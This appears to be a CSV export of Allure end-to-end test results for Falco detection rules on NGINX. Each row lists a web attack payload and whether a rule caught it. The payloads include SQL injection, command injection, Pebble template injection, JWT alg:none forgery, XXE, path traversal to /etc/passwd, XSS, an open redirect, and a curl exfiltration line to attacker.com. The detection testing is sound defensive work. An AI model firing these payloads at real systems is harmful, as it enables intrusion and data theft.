"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_011` |
| **Name** | Basic pipe with id command |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `|id`
- **Encoded**: `%7Cid`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~89000ms
- **Timestamp**: 08:55:00.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via pipe` |
| **Matched Rule** | `[NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_011-1772268900607-ya1ehb pattern_id=CMD_BASIC_011 uri=/?q=%7Cid client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_011-1772268900607-ya1ehb pattern_id=CMD_BASIC_011 uri=/?q=%7Cid client=127.0.0.1

**Falco Log Entry**:
```
08:55:00.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_011-1772268900607-ya1ehb pattern_id=CMD_BASIC_011 uri=/?q=%7Cid client=127.0.0.1
```","1","test_e2e_with_logs[338_CMD_BASIC_011]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ERROR_010` |
| **Name** | MULTIPOINT geometry error injection |
| **Category** | SQLI |
| **Subcategory** | error_based |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `' AND MULTIPOINT((SELECT * FROM(SELECT name_const(version(),1),name_const(version(),1))x)) --`
- **Encoded**: `%27%20AND%20MULTIPOINT%28%28SELECT%20%2A%20FROM%28SELECT%20name_const%28version%28%29%2C1%29%2Cname_const%28version%28%29%2C1%29%29x%29%29%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~82000ms
- **Timestamp**: 08:55:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_010-1772268907157-ya0o1g pattern_id=SQLI_ERROR_010 uri=/?q=%27%20AND%20MULTIPOINT%28%28SELECT%20%2A%20FROM%28SELECT%20name_const%28version%28%29%2C1%29%2Cname_const%28version%28%29%2C1%29%29x%29%29%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_010-1772268907157-ya0o1g pattern_id=SQLI_ERROR_010 uri=/?q=%27%20AND%20MULTIPOINT%28%28SELECT%20%2A%20FROM%28SELECT%20name_const%28version%28%29%2C1%29%2Cname_const%28version%28%29%2C1%29%29x%29%29%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:07.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_010-1772268907157-ya0o1g pattern_id=SQLI_ERROR_010 uri=/?q=%27%20AND%20MULTIPOINT%28%28SELECT%20%2A%20FROM%28SELECT%20name_const%28version%28%29%2C1%29%2Cname_const%28version%28%29%2C1%29%29x%29%29%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[076_SQLI_ERROR_010]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_PEBBLE_001` |
| **Name** | Pebble command execution |
| **Category** | SSTI |
| **Subcategory** | pebble |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `{% set cmd = ""id"" %}{{ system(cmd) }}`
- **Encoded**: `%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~60000ms
- **Timestamp**: 08:55:29.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Template injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Template injection test_id=SSTI_PEBBLE_001-1772268929104-rlrica pattern_id=SSTI_PEBBLE_001 uri=/?q=%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Template injection test_id=SSTI_PEBBLE_001-1772268929104-rlrica pattern_id=SSTI_PEBBLE_001 uri=/?q=%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
08:55:29.000000000: Critical [NGINX Emerging Threat] Template injection test_id=SSTI_PEBBLE_001-1772268929104-rlrica pattern_id=SSTI_PEBBLE_001 uri=/?q=%7B%25%20set%20cmd%20%3D%20%22id%22%20%25%7D%7B%7B%20system(cmd)%20%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[704_SSTI_PEBBLE_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_JWT_004` |
| **Name** | JWT Algorithm None - short form |
| **Category** | API_SECURITY |
| **Subcategory** | jwt |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `eyJhbGciOiJub25lIn0`
- **Encoded**: `eyJhbGciOiJub25lIn0`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~44000ms
- **Timestamp**: 08:55:45.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX API Attack] API security vulnerability detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=API_JWT_004-1772268945620-qi67vy pattern_id=API_JWT_004 uri=/?q=eyJhbGciOiJub25lIn0 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=API_JWT_004-1772268945620-qi67vy pattern_id=API_JWT_004 uri=/?q=eyJhbGciOiJub25lIn0 client=127.0.0.1

**Falco Log Entry**:
```
08:55:45.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=API_JWT_004-1772268945620-qi67vy pattern_id=API_JWT_004 uri=/?q=eyJhbGciOiJub25lIn0 client=127.0.0.1
```","2","test_e2e_with_logs[637_API_JWT_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `JWT_NONE_001` |
| **Name** | JWT alg:none bypass (lowercase) |
| **Category** | JWT |
| **Subcategory** | alg_none |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.`
- **Encoded**: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~4000ms
- **Timestamp**: 08:56:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX JWT] JWT token attack attempt detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=JWT_NONE_001-1772268985594-qduwjh pattern_id=JWT_NONE_001 uri=/?q=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0. client=127.0.0.1` |
| **Rule Match** | ❌ Mismatch |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=JWT_NONE_001-1772268985594-qduwjh pattern_id=JWT_NONE_001 uri=/?q=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0. client=127.0.0.1

**Falco Log Entry**:
```
08:56:25.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=JWT_NONE_001-1772268985594-qduwjh pattern_id=JWT_NONE_001 uri=/?q=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0. client=127.0.0.1
```","2","test_e2e_with_logs[680_JWT_NONE_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_ENTITY_005` |
| **Name** | XXE data URI scheme injection |
| **Category** | XXE |
| **Subcategory** | entity_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<!ENTITY xxe SYSTEM ""data:text/plain;base64,dGVzdA=="">`
- **Encoded**: `%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~77000ms
- **Timestamp**: 08:55:12.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_005-1772268912598-r981nx pattern_id=XXE_ENTITY_005 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_005-1772268912598-r981nx pattern_id=XXE_ENTITY_005 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E client=127.0.0.1

**Falco Log Entry**:
```
08:55:12.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_005-1772268912598-r981nx pattern_id=XXE_ENTITY_005 uri=/?q=%3C!ENTITY%20xxe%20SYSTEM%20%22data%3Atext%2Fplain%3Bbase64%2CdGVzdA%3D%3D%22%3E client=127.0.0.1
```","2","test_e2e_with_logs[568_XXE_ENTITY_005]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_009` |
| **Name** | Hash comment injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' OR 1=1#`
- **Encoded**: `'%20OR%201%3D1%23`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~76000ms
- **Timestamp**: 08:55:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_009-1772268913169-nwilk pattern_id=SQLI_BOOL_009 uri=/?q='%20OR%201%3D1%23 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_009-1772268913169-nwilk pattern_id=SQLI_BOOL_009 uri=/?q='%20OR%201%3D1%23 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:13.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_009-1772268913169-nwilk pattern_id=SQLI_BOOL_009 uri=/?q='%20OR%201%3D1%23 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[045_SQLI_BOOL_009]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_MONGO_007` |
| **Name** | CouchDB _all_docs enumeration |
| **Category** | OTHER |
| **Subcategory** | mongodb_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `_all_docs`
- **Encoded**: `_all_docs`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~83000ms
- **Timestamp**: 08:55:06.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_007-1772268906110-rxc75a pattern_id=EMRG_MONGO_007 uri=/?q=_all_docs client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_007-1772268906110-rxc75a pattern_id=EMRG_MONGO_007 uri=/?q=_all_docs client=127.0.0.1

**Falco Log Entry**:
```
08:55:06.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_007-1772268906110-rxc75a pattern_id=EMRG_MONGO_007 uri=/?q=_all_docs client=127.0.0.1
```","1","test_e2e_with_logs[668_EMRG_MONGO_007]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `AUTH_ADMIN_002` |
| **Name** | Admin API access attempt |
| **Category** | API_SECURITY |
| **Subcategory** | admin_access |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `/admin/api/users`
- **Encoded**: `%2Fadmin%2Fapi%2Fusers`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `NONE` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","2","test_e2e_with_logs[405_AUTH_ADMIN_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_UNI_001` |
| **Name** | Overlong UTF-8 dot encoding |
| **Category** | PATH |
| **Subcategory** | unicode |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`
- **Encoded**: `%25c0%25ae%25c0%25ae%2F%25c0%25ae%25c0%25ae%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~67000ms
- **Timestamp**: 08:55:22.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_UNI_001-1772268922166-xz4j6jq pattern_id=PATH_UNI_001 uri=/?q=%25c0%25ae%25c0%25ae%2F%25c0%25ae%25c0%25ae%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_UNI_001-1772268922166-xz4j6jq pattern_id=PATH_UNI_001 uri=/?q=%25c0%25ae%25c0%25ae%2F%25c0%25ae%25c0%25ae%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
08:55:22.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_UNI_001-1772268922166-xz4j6jq pattern_id=PATH_UNI_001 uri=/?q=%25c0%25ae%25c0%25ae%2F%25c0%25ae%25c0%25ae%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[288_PATH_UNI_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SENSITIVE_BACKUP_001` |
| **Name** | SQL backup file access |
| **Category** | OTHER |
| **Subcategory** | sensitive_file |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `/database.sql.bak`
- **Encoded**: `%2Fdatabase.sql.bak`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~74000ms
- **Timestamp**: 08:55:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Sensitive] Sensitive file access attempt detected` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SENSITIVE_BACKUP_001-1772268915128-g23ryd pattern_id=SENSITIVE_BACKUP_001 uri=/?q=%2Fdatabase.sql.bak client=127.0.0.1 method=GET` |
| **Rule Match** | ❌ Mismatch |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SENSITIVE_BACKUP_001-1772268915128-g23ryd pattern_id=SENSITIVE_BACKUP_001 uri=/?q=%2Fdatabase.sql.bak client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:15.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SENSITIVE_BACKUP_001-1772268915128-g23ryd pattern_id=SENSITIVE_BACKUP_001 uri=/?q=%2Fdatabase.sql.bak client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[424_SENSITIVE_BACKUP_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `REDIR_BYPASS_003` |
| **Name** | Whitelist bypass via subdomain trick |
| **Category** | OPEN_REDIRECT |
| **Subcategory** | whitelist_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `redir=https://evil.com.good.com`
- **Encoded**: `redir%3Dhttps%3A%2F%2Fevil.com.good.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~10000ms
- **Timestamp**: 08:56:19.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Redirect] Open redirect attempt detected` |
| **Matched Rule** | `[NGINX Redirect] Open redirect attempt detected test_id=REDIR_BYPASS_003-1772268979604-0nr5q pattern_id=REDIR_BYPASS_003 uri=/?q=redir%3Dhttps%3A%2F%2Fevil.com.good.com client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Redirect] Open redirect attempt detected test_id=REDIR_BYPASS_003-1772268979604-0nr5q pattern_id=REDIR_BYPASS_003 uri=/?q=redir%3Dhttps%3A%2F%2Fevil.com.good.com client=127.0.0.1

**Falco Log Entry**:
```
08:56:19.000000000: Warning [NGINX Redirect] Open redirect attempt detected test_id=REDIR_BYPASS_003-1772268979604-0nr5q pattern_id=REDIR_BYPASS_003 uri=/?q=redir%3Dhttps%3A%2F%2Fevil.com.good.com client=127.0.0.1
```","2","test_e2e_with_logs[464_REDIR_BYPASS_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_STORED_003` |
| **Name** | Stored SVG onload XSS |
| **Category** | XSS |
| **Subcategory** | stored |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<svg onload=alert('Stored')>`
- **Encoded**: `%3Csvg%20onload%3Dalert%28%27Stored%27%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~67000ms
- **Timestamp**: 08:55:22.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_STORED_003-1772268922178-li1bf pattern_id=XSS_STORED_003 uri=/?q=%3Csvg%20onload%3Dalert%28%27Stored%27%29%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_STORED_003-1772268922178-li1bf pattern_id=XSS_STORED_003 uri=/?q=%3Csvg%20onload%3Dalert%28%27Stored%27%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:55:22.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_STORED_003-1772268922178-li1bf pattern_id=XSS_STORED_003 uri=/?q=%3Csvg%20onload%3Dalert%28%27Stored%27%29%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[225_XSS_STORED_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BLIND_003` |
| **Name** | Out-of-band data exfiltration via curl |
| **Category** | CMDINJ |
| **Subcategory** | blind_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `| curl http://attacker.com/callback?data=`whoami``
- **Encoded**: `%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~80000ms
- **Timestamp**: 08:55:09.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_BLIND_003-1772268909127-k657e pattern_id=CMD_BLIND_003 uri=/?q=%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_003-1772268909127-k657e pattern_id=CMD_BLIND_003 uri=/?q=%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60 client=127.0.0.1

**Falco Log Entry**:
```
08:55:09.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_003-1772268909127-k657e pattern_id=CMD_BLIND_003 uri=/?q=%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60 client=127.0.0.1
```","2","test_e2e_with_logs[351_CMD_BLIND_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
